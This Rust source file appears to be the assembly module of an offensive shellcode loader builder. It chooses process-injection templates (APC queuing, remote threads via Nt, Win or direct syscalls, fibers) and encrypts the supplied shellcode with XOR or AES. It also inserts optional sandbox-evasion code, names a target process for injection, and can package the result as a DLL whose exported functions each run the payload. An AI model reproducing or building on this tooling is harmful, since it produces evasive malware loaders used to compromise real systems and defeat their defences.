// Module building the end-result Rust code
use crate::aes::meta_aes;
use crate::arg_parser::{Encryption, Execution, Format, Order};
use crate::tools::random_aes_iv;
use crate::tools::random_aes_key;
use crate::tools::{absolute_path, path_to_string, random_u8};
use crate::xor::meta_xor;
use crate::sandbox::meta_sandbox;
use fs_extra::dir::{copy, CopyOptions};
use std::collections::HashMap;
use std::fs::{self, OpenOptions};
use std::io::prelude::*;
use std::path::Path;
use std::path::PathBuf;
use std::process::exit;
use std::str;
use std::time::{SystemTime, UNIX_EPOCH};

fn search_and_replace(
    path_to_file: &Path,
    search: &str,
    replace: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    // thanks to https://users.rust-lang.org/t/replacing-content-in-file/52690/5
    let file_content = fs::read_to_string(path_to_file)?;
    let new_content = file_content.replace(search, replace);

    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(path_to_file)?;
    file.write_all(new_content.as_bytes())?;

    Ok(())
}

fn create_root_folder(general_output_folder: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let time = format!(
        "{:?}",
        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs()
    );
    let prefix = "output_";
    let result = [prefix, &time].join("");
    println!("[+] Creating output folder: {}", &result);
    let mut result_path = general_output_folder.to_path_buf();
    result_path.push(result);
    fs::create_dir(&result_path)?;

    Ok(result_path)
}

fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let options = CopyOptions {
        content_only: true,
        ..Default::default()
    };
    copy(source, dest, &options)?;

    Ok(())
}

pub fn meta_puzzle(order: Order) -> PathBuf {
    println!("[+] Assembling Rust code..");
    //dbg!("{}", &order.encryption);
    let mut general_output_folder = PathBuf::new();
    general_output_folder.push("shared");

    let path_to_template = match order.execution {
        // Execution::CreateThread => Path::new("templates/createThread/."),
        // Execution::CreateRemoteThread => Path::new("templates/createRemoteThread/."),
        Execution::NtQueueUserAPC => Path::new("templates/ntAPC/."),
        Execution::NtCreateRemoteThread => Path::new("templates/ntCRT/."),
        Execution::SysCreateRemoteThread => Path::new("templates/sysCRT/."),
        Execution::WinCreateRemoteThread => Path::new("templates/winCRT/."),
        Execution::WinFiber => Path::new("templates/winFIBER/."),
        Execution::NtFiber => Path::new("templates/ntFIBER/."),
        Execution::SysFiber => Path::new("templates/sysFIBER/."),
    };

    let folder: PathBuf = match create_root_folder(&general_output_folder) {
        Ok(content) => content,
        Err(err) => panic!("{:?}", err),
    };
    match copy_template(path_to_template, &folder) {
        Ok(_) => (),
        Err(err) => panic!("{:?}", err),
    }
    let mut to_main = folder.clone();
    to_main.push("src");
    to_main.push("main.rs");

    let absolute_shellcode_path = match absolute_path(&order.shellcode_path) {
        Ok(path) => path,
        Err(err) => panic!("{:?}", err),
    };

    let absolute_shellcode_path_as_string: String = path_to_string(&absolute_shellcode_path);

    let mut path_to_cargo = to_main.clone();
    path_to_cargo.pop();
    path_to_cargo.pop();
    path_to_cargo.push("Cargo.toml");

    let mut to_be_replaced = HashMap::new();
    to_be_replaced.insert("{{DEPENDENCIES}}", "".to_string());
    to_be_replaced.insert("{{IMPORTS}}", "".to_string());
    to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", "".to_string());
    to_be_replaced.insert("{{MAIN}}", "".to_string());
    to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_shellcode_path_as_string);
    to_be_replaced.insert("{{DLL_MAIN}}", "".to_string());
    to_be_replaced.insert("{{DLL_FORMAT}}", "".to_string());
    to_be_replaced.insert("{{TARGET_PROCESS}}", order.target_process);

    match order.encryption {
        Encryption::Xor => {
            let key = random_u8();
            let mut path_to_xor = to_main.clone();
            path_to_xor.pop();
            path_to_xor.push("input.xor");
            let absolute_path_to_xor = match absolute_path(&path_to_xor) {
                Ok(path) => path,
                Err(err) => panic!("{:?}", err),
            };
            let absolute_path_to_xor_as_string = path_to_string(&absolute_path_to_xor);

            let xor_args: HashMap<String, String> =
                meta_xor(&order.shellcode_path, &path_to_xor, key);
            let decryption_function = match xor_args.get("decryption_function") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            let main = match xor_args.get("main") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
            to_be_replaced.insert("{{MAIN}}", main.to_string());
            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_xor_as_string);
        }
        Encryption::Aes => {
            let key = random_aes_key();
            let iv = random_aes_iv();

            let mut path_to_aes = to_main.clone();
            path_to_aes.pop();
            path_to_aes.push("input.aes");
            let absolute_path_to_aes = match absolute_path(&path_to_aes) {
                Ok(path) => path,
                Err(err) => panic!("{:?}", err),
            };
            let absolute_path_to_aes_as_string = path_to_string(&absolute_path_to_aes);

            let aes_args: HashMap<String, String> =
                meta_aes(&order.shellcode_path, &path_to_aes, &key, &iv);

            let decryption_function = match aes_args.get("decryption_function") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            let main = match aes_args.get("main") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            let dependencies = match aes_args.get("dependencies") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            let imports = match aes_args.get("imports") {
                Some(content) => content,
                None => panic!("I don't even know how this happened.."),
            };
            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function.to_string());
            to_be_replaced.insert("{{MAIN}}", main.to_string());
            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", absolute_path_to_aes_as_string);
            to_be_replaced.insert("{{DEPENDENCIES}}", dependencies.to_string());
            to_be_replaced.insert("{{IMPORTS}}", imports.to_string());
        }
    }
    if order.sandbox != "None" {
        // if sandbox is not None, we need to add the sandbox function and imports
        let sandbox_args: HashMap<String, String> = meta_sandbox(order.sandbox.clone());
        let sandbox_function = match sandbox_args.get("sandbox_function") {
            Some(content) => content,
            None => panic!("I don't even know how this happened.."),
        };
        to_be_replaced.insert("{{SANDBOX}}", sandbox_function.to_string());

        let sandbox_imports = match sandbox_args.get("sandbox_import") {
            Some(content) => content,
            None => panic!("I don't even know how this happened.."),
        };
        to_be_replaced.insert("{{SANDBOX_IMPORTS}}", sandbox_imports.to_string());
    } else {
        // if sandbox is None, we need to remove the sandbox function and imports
        to_be_replaced.insert("{{SANDBOX}}", "".to_string());
        to_be_replaced.insert("{{SANDBOX_IMPORTS}}", "".to_string());
    }

    match order.format {
        Format::Dll => {
            let dll_cargo_conf = r#"
            [lib]
            crate-type = ["cdylib"]"#;

            to_be_replaced.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());

            let dll_main_fn = r#"
            #[no_mangle]
            #[allow(non_snake_case, unused_variables, unreachable_patterns)]
            extern "system" fn DllMain(
                dll_module: u32,
                call_reason: u32,
                _: *mut ())
                -> bool
            {
                match call_reason {
                    DLL_PROCESS_ATTACH => (),
                    DLL_PROCESS_DETACH => (),
                    _ => ()
                }

                true
            }
            #[no_mangle]
            pub extern "C" fn DllRegisterServer() {{
                main()
            }}
            #[no_mangle]
            pub extern "C" fn DllGetClassObject() {{
                main()
            }}
            #[no_mangle]
            pub extern "C" fn DllUnregisterServer() {{
                main()
            }}
            #[no_mangle]
            pub extern "C" fn Run() {{
                main()
            }}
            "#;
            to_be_replaced.insert("{{DLL_MAIN}}", dll_main_fn.to_string());

            // changing "main.rs" to "lib.rs"

            let mut to_lib = to_main.clone();
            to_lib.pop();
            to_lib.push("lib.rs");

            match fs::rename(to_main, to_lib.clone()) {
                Ok(()) => (),
                Err(e) => {
                    eprintln!("[-] Error while renaming main.rs to lib.rs: {}", e);
                    exit(1);
                }
            }

            // need to change the main file path, as it is now renamed "lib.rs" for DLL format.
            to_main = to_lib;
        }
        Format::Exe => (), // nothing to do here, as the default "replace" values are emspty strings
    }

    for (key, value) in to_be_replaced.iter() {
        let _ = search_and_replace(&to_main, key, value);
        let _ = search_and_replace(&path_to_cargo, key, value);
    }
    
    println!("[+] Done assembling Rust code!");
    Path::new(&folder).to_path_buf()
}
